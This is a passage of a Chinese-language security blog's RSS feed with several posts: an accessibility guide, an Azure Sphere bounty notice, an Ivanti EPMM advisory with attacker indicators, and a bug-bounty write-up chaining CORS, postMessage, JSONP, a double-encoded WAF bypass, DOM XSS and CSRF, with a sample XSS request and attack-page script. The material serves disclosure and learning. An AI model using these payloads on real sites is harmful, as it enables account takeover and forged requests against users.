class=&#34;sb&#34;&gt;`?content=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;itemId&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;最佳实践方案&#34;&gt;最佳实践方案
&lt;/h2&gt;&lt;h3 id=&#34;1-aria角色与属性&#34;&gt;1. ARIA角色与属性
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;对自动更新内容使用&lt;code&gt;aria-live=&amp;quot;polite&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;为下拉菜单添加&lt;code&gt;aria-expanded&lt;/code&gt;状态&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;aria-label&lt;/code&gt;提供元素描述&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-键盘导航优化&#34;&gt;2. 键盘导航优化
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;实现模态对话框的焦点陷阱&lt;/li&gt;
&lt;li&gt;添加&amp;quot;跳过导航&amp;quot;链接&lt;/li&gt;
&lt;li&gt;提供常用操作的键盘快捷键&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-性能优化策略&#34;&gt;3. 性能优化策略
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;压缩JavaScript/CSS文件&lt;/li&gt;
&lt;li&gt;使用WebP等现代图片格式&lt;/li&gt;
&lt;li&gt;异步加载非关键脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-渐进增强原则&#34;&gt;4. 渐进增强原则
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;确保核心功能不依赖JavaScript&lt;/li&gt;
&lt;li&gt;禁用JS环境下测试关键流程&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-持续无障碍测试&#34;&gt;5. 持续无障碍测试
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;集成WAVE、Lighthouse等自动化工具&lt;/li&gt;
&lt;li&gt;组织真实辅助技术用户测试&lt;/li&gt;
&lt;li&gt;定期使用NVDA/JAWS屏幕阅读器验证&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过实施这些技术方案，开发者可以构建既保持SPA动态特性又符合无障碍标准的现代Web应用。建议进一步参考WCAG标准和ARIA创作实践指南获取完整规范。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>欢迎参与Azure Sphere安全研究——现已正式发布</title>
        <link>http://localhost:1313/p/%E6%AC%A2%E8%BF%8E%E5%8F%82%E4%B8%8Eazure-sphere%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%8E%B0%E5%B7%B2%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83/</link>
        <pubDate>Fri, 01 Aug 2025 21:04:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%AC%A2%E8%BF%8E%E5%8F%82%E4%B8%8Eazure-sphere%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%8E%B0%E5%B7%B2%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83/</guid>
        <description>&lt;p&gt;今天，微软宣布Azure Sphere全面上市（GA）。&lt;br&gt;
Azure Sphere的使命是赋能全球每个组织连接并创建安全可信的物联网设备。它是一个端到端的安全解决方案，既支持安全连接现有设备，也能为新型物联网设备提供内置安全保障。该解决方案涵盖硬件、操作系统和云服务，并通过持续的安全与系统更新确保设备在威胁演变中保持防护。&lt;/p&gt;
&lt;p&gt;创新要产生持久价值，必须建立在安全基础之上。安全研究人员通过协调漏洞披露（CVD）向微软提交漏洞报告，持续为保护数十亿用户发挥着关键作用。随着Azure Sphere的正式发布，我们邀请全球研究人员通过&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/msrc/bounty&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;微软Azure赏金计划&lt;/a&gt;挖掘其高影响漏洞。符合条件的研究成果最高可获得4万美元奖励。&lt;/p&gt;
&lt;p&gt;若您对物联网安全研究感兴趣，请&lt;a class=&#34;link&#34; href=&#34;https://aka.ms/AzureSphereBountySignup&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;点击此处&lt;/a&gt;注册以获取项目信息。我们期待在未来数月分享更多计划进展！&lt;/p&gt;
&lt;p&gt;了解更多Azure Sphere信息，请访问&lt;a class=&#34;link&#34; href=&#34;https://azure.microsoft.com/blog/azure-sphere-now-generally-available/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;正式发布公告博客&lt;/a&gt;及&lt;a class=&#34;link&#34; href=&#34;https://azure.microsoft.com/services/azure-sphere/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Azure Sphere官网&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;——Sylvie Liu，微软安全响应中心安全项目经理&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Ivanti EPMM漏洞组合实现未授权远程代码执行攻击</title>
        <link>http://localhost:1313/p/ivanti-epmm%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB/</link>
        <pubDate>Fri, 01 Aug 2025 20:57:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ivanti-epmm%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;h1 id=&#34;摘要&#34;&gt;摘要
&lt;/h1&gt;&lt;p&gt;3月13日，Ivanti披露了影响其本地部署版Endpoint Manager Mobile产品的两个漏洞：CVE-2025-4427（认证绕过）和CVE-2025-4428（认证后RCE漏洞）。虽然单个漏洞严重性不高（CVSS评分分别为5.3和7.2），但组合利用后可使未认证攻击者在受影响EPMM实例上执行恶意代码。Ivanti确认在初始披露前已发现有限的实际攻击案例，GreyNoise和Wiz等多家机构证实自5月16日起出现大规模攻击活动，这与漏洞验证代码的公开时间基本吻合。&lt;/p&gt;
&lt;h1 id=&#34;受影响系统和或应用&#34;&gt;受影响系统和/或应用
&lt;/h1&gt;&lt;p&gt;以下版本的Ivanti Endpoint Manager Mobile：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;11.12.0.4及之前版本&lt;/li&gt;
&lt;li&gt;12.3.0.1及之前版本&lt;/li&gt;
&lt;li&gt;12.4.0.1及之前版本&lt;/li&gt;
&lt;li&gt;12.5.0.0及之前版本&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;技术细节攻击概述&#34;&gt;技术细节/攻击概述
&lt;/h1&gt;&lt;p&gt;Wiz对漏洞技术细节进行了精要总结：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;CVE-2025-4428是EPMM设备功能使用报告查询验证器(DeviceFeatureUsageReportQueryRequestValidator)中的认证后远程代码执行漏洞。该漏洞源于Spring框架的AbstractMessageSource在处理错误消息时对用户输入的不安全处理，导致攻击者可通过EL表达式注入实现任意Java代码执行。精心构造/api/v2/featureusage端点中的format参数即可触发命令注入（如Runtime.exec()）。&lt;/p&gt;
&lt;p&gt;CVE-2025-4427是EPMM路由配置中的认证绕过漏洞。由于Spring Security配置缺少&lt;intercept-url&gt;规则，导致/rs/api/v2/featureusage等路由意外暴露。这使得攻击者无需认证即可访问RCE触发点，在与CVE-2025-4428组合后实现完全的预认证RCE。但如watchTowr所指出的，这更准确地说是一个操作顺序缺陷，因为验证器逻辑在认证检查之前执行。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Wiz还分享了从Sliver植入案例中提取的威胁指标：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;IOC&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1b1dda5e8e26da568559e0577769697c624df30e&lt;/td&gt;
          &lt;td&gt;Sliver Beacon (SHA1)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ac389c8b7f3d2fcf4fd73891f881b12b8343665b&lt;/td&gt;
          &lt;td&gt;Sliver Beacon (SHA1)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;79.96.45[.]181&lt;/td&gt;
          &lt;td&gt;Sliver C2 IP地址&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;该C2 IP目前仍处于活跃状态，根据共享证书判断，以下服务器可能也由同一攻击者控制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;185.174.137[.]26&lt;/li&gt;
&lt;li&gt;46.41.134[.]8&lt;/li&gt;
&lt;li&gt;79.96.45[.]181&lt;/li&gt;
&lt;li&gt;elektrobohater[.]pl&lt;/li&gt;
&lt;li&gt;wagodirect[.]pl&lt;/li&gt;
&lt;li&gt;e-wago[.]pl&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h1&gt;&lt;p&gt;将EPMM实例升级至以下版本：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;11.12.0.5&lt;/li&gt;
&lt;li&gt;12.3.0.2&lt;/li&gt;
&lt;li&gt;12.4.0.2&lt;/li&gt;
&lt;li&gt;12.5.0.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在打补丁前，建议限制对受认证绕过影响的端点（/rs/api/v2/* 和 /mifs/rs/api/v2/*）的网络访问。&lt;/p&gt;
&lt;h1 id=&#34;网络融合中心采取的措施&#34;&gt;网络融合中心采取的措施
&lt;/h1&gt;&lt;p&gt;CFC将持续监控事态发展，必要时发布安全通告更新。除IOC检测外，正在研究更多威胁狩猎可能性。订阅漏洞扫描服务的客户将在扫描提供商发布相关插件后立即获得关键漏洞扫描结果。&lt;/p&gt;
&lt;p&gt;Qualys ID：530061, 732523&lt;br&gt;
Tenable ID：235860&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;参考链接
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.ivanti.com/blog/epmm-security-update&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.ivanti.com/blog/epmm-security-update&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.greynoise.io/blog/ivanti-epmm-zero-days-reconnaissance-exploitation&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.greynoise.io/blog/ivanti-epmm-zero-days-reconnaissance-exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-exploited-in-the-wil-cve-2025-4427-cve-2025-4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-exploited-in-the-wil-cve-2025-4427-cve-2025-4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</link>
        <pubDate>Fri, 01 Aug 2025 20:51:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</guid>
        <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR
&lt;/h1&gt;&lt;p&gt;数月前在某公开漏洞赏金项目中，作者发现了一个精妙的漏洞链，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不安全的message事件监听&lt;/li&gt;
&lt;li&gt;粗糙的JSONP端点&lt;/li&gt;
&lt;li&gt;WAF绕过技巧&lt;/li&gt;
&lt;li&gt;范围外子域的DOM型XSS&lt;/li&gt;
&lt;li&gt;过度宽松的CORS配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些漏洞最终组合实现了对范围内资产的CSRF攻击。本文将深度剖析这个攻击链的技术细节。&lt;/p&gt;
&lt;h1 id=&#34;寻找棘手的csrf漏洞&#34;&gt;寻找棘手的CSRF漏洞
&lt;/h1&gt;&lt;p&gt;目标赏金项目的范围仅限于&lt;code&gt;www.redacted.com&lt;/code&gt;及其少数子域。当常规测试思路枯竭时，作者注意到&lt;code&gt;inscope.redacted.com&lt;/code&gt;等子域会向&lt;code&gt;https://www.redacted.com/api&lt;/code&gt;发送包含敏感操作（如更新用户资料）的POST请求。这些请求依赖标记为&lt;code&gt;SameSite=None&lt;/code&gt;和&lt;code&gt;Secure&lt;/code&gt;的&lt;code&gt;sid&lt;/code&gt;cookie进行认证，但作为CSRF防护，端点要求查询参数中包含与会话绑定的&lt;code&gt;csrftoken&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;宽松的cors策略突破范围限制&#34;&gt;宽松的CORS策略突破范围限制
&lt;/h1&gt;&lt;p&gt;测试发现&lt;code&gt;https://www.redacted.com/profile&lt;/code&gt;端点的CORS配置不仅允许&lt;code&gt;https://in-scope.redacted.com&lt;/code&gt;，还接受任意&lt;code&gt;redacted.com&lt;/code&gt;子域的请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -sD - -o /dev/null &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Origin: https://whatever.redacted.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie: sid=xxx-yyy-zzz&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  https://www.redacted.com/profile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Origin: https://whatever.redacted.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;范围外子域的不安全消息监听&#34;&gt;范围外子域的不安全消息监听
&lt;/h1&gt;&lt;p&gt;使用postMessage-tracker插件发现&lt;code&gt;https://out-of-scope.redacted.com/search&lt;/code&gt;存在未做来源检查的message事件监听器，其处理逻辑会：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解析事件数据为JSON对象&lt;/li&gt;
&lt;li&gt;按点号分割method属性&lt;/li&gt;
&lt;li&gt;递归访问window.APP对象的嵌套属性&lt;/li&gt;
&lt;li&gt;调用最终获得的函数并传入arg参数&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;粗糙的jsonp端点导致dom型xss&#34;&gt;粗糙的JSONP端点导致DOM型XSS
&lt;/h1&gt;&lt;p&gt;&lt;code&gt;window.APP.apiCall&lt;/code&gt;函数用于向&lt;code&gt;https://search.redacted.com&lt;/code&gt;的JSONP端点发送请求，但存在两个关键问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;URL构造不安全&lt;/li&gt;
&lt;li&gt;回调参数验证存在缺陷&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过双重URL编码可绕过Akamai WAF防护：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;https://search.redacted.com/&amp;amp;callback=alert%2528%2527xss%2527%2529%252F%252F&amp;amp;output=jsonp&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;组合利用实现一键csrf&#34;&gt;组合利用实现一键CSRF
&lt;/h1&gt;&lt;p&gt;最终攻击流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;诱导用户点击恶意页面按钮&lt;/li&gt;
&lt;li&gt;弹出窗口打开目标页面&lt;/li&gt;
&lt;li&gt;通过postMessage触发JSONP请求&lt;/li&gt;
&lt;li&gt;利用XSS窃取CSRF令牌&lt;/li&gt;
&lt;li&gt;伪造用户资料更新请求&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;攻击页面核心代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendMsg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;//`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;APP.apiCall&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;arg&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;amp;callback=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;&amp;amp;output=jsonp#`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;postMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;后续&#34;&gt;后续
&lt;/h1&gt;&lt;p&gt;虽然漏洞链技术复杂度高（CVSS 7.1 High），但最终仅获得200欧元奖励。这反映出某些赏金项目对复杂攻击链的价值评估可能存在偏差。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>请勿在DNS MX记录中直接使用IP地址 - 邮件服务器配置指南</title>
        <link>http://localhost:1313/p/%E8%AF%B7%E5%8B%BF%E5%9C%A8dns-mx%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ip%E5%9C%B0%E5%9D%80-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</link>
        <pubDate>Wed, 30 Jul 2025 21:00:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%AF%B7%E5%8B%BF%E5%9C%A8dns-mx%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ip%E5%9C%B0%E5%9D%80-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;请勿在dns-mx记录中直接使用ip地址&#34;&gt;请勿在DNS MX记录中直接使用IP地址
&lt;/h1&gt;&lt;p&gt;我想强调邮件服务器DNS记录中一个常见的错误配置。&lt;/p&gt;
&lt;p&gt;当域名配置接收邮件时，通常需要设置指向邮件服务器主机名的MX类型DNS记录。值得注意的是，根据RFC 1035规范，MX记录必须包含域名而&lt;strong&gt;不能直接指向IP地址&lt;/strong&gt;。但某些邮件服务器仍会错误配置IP地址。多数邮件服务器对此类配置错误较为宽容仍能投递邮件，导致问题难以被发现。&lt;/p&gt;
